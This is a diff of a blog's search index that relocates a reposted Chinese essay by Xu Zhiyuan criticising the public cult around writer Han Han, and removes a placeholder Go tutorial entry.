-<p>此刻的中国，人人都在谈论韩寒。他像是越来越压抑、越来越迷惘的时代的最后救命稻草。上了年纪的知识分子说他头脑清醒，媒体欢呼他是“青年领袖”、“年度人物”，青年人觉得他不仅很酷，还有思想。</p>
-<p>没人能否认韩寒的魅力。他能把赛车冠军、畅销书作家、叛逆小子和即兴讽刺者等多重的角色结合，并能在种种诱惑面前保持警惕，况且他才二十七岁。人们尤其着迷于最后一点，他在自己全球浏览量第一的博客上，嘲讽这社会中的种种愚蠢和不公——它们绝大多数与这个越来越膨胀和傲慢的官僚系统相关。有些时候，他不仅嘲讽，还期待创造意义，尽管他还不清楚这意义到底是什么。</p>
-<p>作为一个青年人，这似乎已经足了，他必定是我们时代最可爱、最聪明的明星人物。但很多人(包括一些自认有思想的人)把他推到了一个令他本人都尴尬的位置——他要成为这个时代的英雄，象征着思想的力量，象征着对权力的反抗。</p>
-<p>但这不是韩寒，人们越是把他推向这个位置，越暴露出这个时代、这些高声吶喊者的愚蠢、脆弱与怯懦。在某种意义上，韩寒的胜利不是他个人的胜利，而是这个正在兴起的庸众时代的胜利。</p>
-<p>是的，你可以说每个杰出人物必然与他身处的时代相关联，但一种越来越明显的趋势是——名声和有影响力越来越与个人的质量、才能与成就无关。在西方，这是个Paris Hilton和苏珊大妈的年代——她因为有名而有名，因为不怕出丑而有名。在中国，这是个李宇春与小沈阳的年代——人们因她小小的个性，或是他的自我贬损，而把票投给他们。</p>
-<p>韩寒与他们不同，却也是被同样一种力量推到今天的舞台。他是这个时代明星文化与成功文化的产物，也符合这个时代所推崇的业余精神——赛车、写作、表演，你都要会一点；他还下意识响应了日趋悤烈的反智倾向，他的文章总是如此浅显直白，没有任何阅读障碍，也不会提到任何你不知道的知识；还有他嘲讽式的挑衅姿态，显得如此机智，他还熟知挑战的分寸，绝不真正越政治雷池一步；他也从来不暴露自己内心的焦灼与困惑，很酷……</p>
-<span id="more"></span>
-
-<p>于是谈论韩寒，变成了一次全方位的心理按摩。你沐浴了青春、酷、成功、机智、还觉得自己参与了一场反抗，同时又是如此安全，你不需要付出任何智力上、道德上的代价，也没有任何精神上的仿徨，他是这个社会最美妙的消费品。</p>
-<p>但世上真有如此美事吗？用LXB来比较韩寒，既不恰当也不公平。但是，公众对两者的态度，却恰好不过的映衬了这个时代的特征。人们不谈论LXB，是因为他的名字不能出现在公共话语空间，也因为这有点危险。但集体性地沉默与忽视也在表明，其实我们对于真正的自由与反抗毫无兴趣，甚至心生恐惧。自由是需要付出代价的，它不仅要反抗，而且有明确的主张。这需要智力与情感上的成熟，并愿意为自己的决定承担后果。</p>
-<p>对于韩寒的热烈推崇，是整个社会拒绝付出代价的标志。当我们沉浸于只言词组的嘲讽时，一定误以为自己已消解了这可恶的权力体制，其实一点没变，嘲讽只是为上面裹了一层糖衣，但我们进行自我麻醉，还将此视作一次反抗。</p>
-<p>而且，人们或许也觉得，韩寒也不需要为行动承担任何后果，他可以进行象征性、边缘性的反抗了，然后还全身而退，像是去商场进行一次购物。韩寒成了所有人的借口，人们借着他撒娇，卖弄自己那可怜的“小心思”。</p>
-<p>但公众必定为这种愚蠢和怯懦付出代价。既然他们对于真正的成就缺乏兴趣，不去赞叹那些卓绝的道德勇气，不去准备接纳真正的思想，他们就只能在这个烂泥塘中继续打转，相互抱怨、相互麻痹。因为这庸众的数量是如此的巨大，他们还会产生这样的错觉——中国已经影响世界。中国的确影响了世界，但它只是数量上的造就，而非真正值得尊敬的成就。韩寒掀起的迷狂，衬托出这个崛起大国的内在苍白、可悲、浅薄——一个聪明的青年人、说出了一些真话，他就让这个时代的神经震颤不已。与其说这是韩寒的胜利，不如说是庸众的胜利，或是整个民族的失败。</p>
-]]></content>
-      <categories>
-        <category>社会</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Unix Domain Socket vs TCP SOCKET</title>
     <url>/2017/06/20/unix-domain-socket-vs-tcp-socket/</url>
     <content><![CDATA[<p>之前配置lnmp环境时有发现php-fpm既可以监听<code>127.0.0.1:9000</code>(ip+端口形式), 也可以监听<code>/path/to/unix/socket</code>(Unix Domain Socket形式), 用起来感觉并没有什么差异, 网上查下了资料，大略总结下。</p>
@@ -2231,6 +2221,32 @@ Pragma: no-cache
         <tag>tcp/ip</tag>
         <tag>php-fpm</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>许知远：庸众的胜利</title>
+    <url>/2017/01/17/the-victory-of-mediocre-persons/</url>
+    <content><![CDATA[<blockquote>
+<p>文: 许知远<br>来源: 凤凰网<br>链接: <a href="http://book.ifeng.com/culture/1/detail_2010_05/11/1504069_0.shtml">http://book.ifeng.com/culture/1/detail_2010_05/11/1504069_0.shtml</a> </p>
+</blockquote>
+<p>大约三十年前，当法国学生们被问道，谁是他们最仰慕的公众人物时，他们选择的不是老年萨特，而是米歇尔.科卢奇——一位电视喜剧演员，以嘲讽和出言不逊著称。</p>
+<p>时代的风尚转变了，六十年代的理想主义、改变世界的愿望，让位于七十年代的幻灭与狭隘的个人主义。嘲讽成了时代的情绪，人们在乎的是姿态，而不是内容。</p>
+<p>此刻的中国，人人都在谈论韩寒。他像是越来越压抑、越来越迷惘的时代的最后救命稻草。上了年纪的知识分子说他头脑清醒，媒体欢呼他是“青年领袖”、“年度人物”，青年人觉得他不仅很酷，还有思想。</p>
+<p>没人能否认韩寒的魅力。他能把赛车冠军、畅销书作家、叛逆小子和即兴讽刺者等多重的角色结合，并能在种种诱惑面前保持警惕，况且他才二十七岁。人们尤其着迷于最后一点，他在自己全球浏览量第一的博客上，嘲讽这社会中的种种愚蠢和不公——它们绝大多数与这个越来越膨胀和傲慢的官僚系统相关。有些时候，他不仅嘲讽，还期待创造意义，尽管他还不清楚这意义到底是什么。</p>
+<p>作为一个青年人，这似乎已经足了，他必定是我们时代最可爱、最聪明的明星人物。但很多人(包括一些自认有思想的人)把他推到了一个令他本人都尴尬的位置——他要成为这个时代的英雄，象征着思想的力量，象征着对权力的反抗。</p>
+<p>但这不是韩寒，人们越是把他推向这个位置，越暴露出这个时代、这些高声吶喊者的愚蠢、脆弱与怯懦。在某种意义上，韩寒的胜利不是他个人的胜利，而是这个正在兴起的庸众时代的胜利。</p>
+<p>是的，你可以说每个杰出人物必然与他身处的时代相关联，但一种越来越明显的趋势是——名声和有影响力越来越与个人的质量、才能与成就无关。在西方，这是个Paris Hilton和苏珊大妈的年代——她因为有名而有名，因为不怕出丑而有名。在中国，这是个李宇春与小沈阳的年代——人们因她小小的个性，或是他的自我贬损，而把票投给他们。</p>
+<p>韩寒与他们不同，却也是被同样一种力量推到今天的舞台。他是这个时代明星文化与成功文化的产物，也符合这个时代所推崇的业余精神——赛车、写作、表演，你都要会一点；他还下意识响应了日趋悤烈的反智倾向，他的文章总是如此浅显直白，没有任何阅读障碍，也不会提到任何你不知道的知识；还有他嘲讽式的挑衅姿态，显得如此机智，他还熟知挑战的分寸，绝不真正越政治雷池一步；他也从来不暴露自己内心的焦灼与困惑，很酷……</p>
+<span id="more"></span>
+
+<p>于是谈论韩寒，变成了一次全方位的心理按摩。你沐浴了青春、酷、成功、机智、还觉得自己参与了一场反抗，同时又是如此安全，你不需要付出任何智力上、道德上的代价，也没有任何精神上的仿徨，他是这个社会最美妙的消费品。</p>
+<p>但世上真有如此美事吗？用LXB来比较韩寒，既不恰当也不公平。但是，公众对两者的态度，却恰好不过的映衬了这个时代的特征。人们不谈论LXB，是因为他的名字不能出现在公共话语空间，也因为这有点危险。但集体性地沉默与忽视也在表明，其实我们对于真正的自由与反抗毫无兴趣，甚至心生恐惧。自由是需要付出代价的，它不仅要反抗，而且有明确的主张。这需要智力与情感上的成熟，并愿意为自己的决定承担后果。</p>
+<p>对于韩寒的热烈推崇，是整个社会拒绝付出代价的标志。当我们沉浸于只言词组的嘲讽时，一定误以为自己已消解了这可恶的权力体制，其实一点没变，嘲讽只是为上面裹了一层糖衣，但我们进行自我麻醉，还将此视作一次反抗。</p>
+<p>而且，人们或许也觉得，韩寒也不需要为行动承担任何后果，他可以进行象征性、边缘性的反抗了，然后还全身而退，像是去商场进行一次购物。韩寒成了所有人的借口，人们借着他撒娇，卖弄自己那可怜的“小心思”。</p>
+<p>但公众必定为这种愚蠢和怯懦付出代价。既然他们对于真正的成就缺乏兴趣，不去赞叹那些卓绝的道德勇气，不去准备接纳真正的思想，他们就只能在这个烂泥塘中继续打转，相互抱怨、相互麻痹。因为这庸众的数量是如此的巨大，他们还会产生这样的错觉——中国已经影响世界。中国的确影响了世界，但它只是数量上的造就，而非真正值得尊敬的成就。韩寒掀起的迷狂，衬托出这个崛起大国的内在苍白、可悲、浅薄——一个聪明的青年人、说出了一些真话，他就让这个时代的神经震颤不已。与其说这是韩寒的胜利，不如说是庸众的胜利，或是整个民族的失败。</p>
+]]></content>
+      <categories>
+        <category>社会</category>
+      </categories>
   </entry>
   <entry>
     <title>vim常用命令</title>
@@ -2277,21 +2293,5 @@ Pragma: no-cache
       <tags>
         <tag>vim</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Go by Example - Stateful Goroutines</title>
-    <url>/2018/02/06/go-by-example-stateful-goroutines/</url>
-    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
-<blockquote>
-<p>Go by Example</p>
-<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
-<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
-</blockquote>
-<h2 id="Go-by-Example-Stateful-Goroutines"><a href="#Go-by-Example-Stateful-Goroutines" class="headerlink" title="Go by Example: Stateful Goroutines"></a><center>Go by Example: Stateful Goroutines</center></h2><p>未完待续…</p>
-]]></content>
-      <categories>
-        <category>golang</category>
-        <category>笔记</category>
-      </categories>
   </entry>
 </search>
